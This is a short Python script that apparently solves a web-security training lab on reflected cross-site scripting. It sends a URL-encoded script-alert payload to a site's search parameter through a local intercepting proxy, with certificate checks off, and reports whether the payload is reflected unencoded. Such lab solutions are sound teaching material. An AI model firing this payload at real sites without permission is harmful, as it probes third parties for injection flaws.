import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http' : 'http://127.0.0.1:8080' , 'https' : 'http://127.0.0.1:8080'}

def xss_attack(url):
    # SEARCH URL + PAYLOAD
    search_url = url + '/?search=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E'

    # SEND PAYLOAD
    r = requests.get(search_url, verify=False, proxies=proxies)

    # CHECK RESPONSE
    if "<h1>0 search results for '<script>alert('XSS')</script>'</h1>" not in r.text:
        print("[-] Exploit failed!")
        sys.exit(-1)
    print("[+] Exploit worked!")


def main():
    if len(sys.argv) != 2:
        print("[-] Usage: %s <url>" % sys.argv[0])
        print("[-] Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1].strip()

    print("[+] Lab: Reflected XSS into HTML context with nothing encoded")
    print("""[+] This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
    To solve the lab, perform a cross-site scripting attack that calls the alert function.""")

    xss_attack(url)


if __name__ == "__main__":
    main()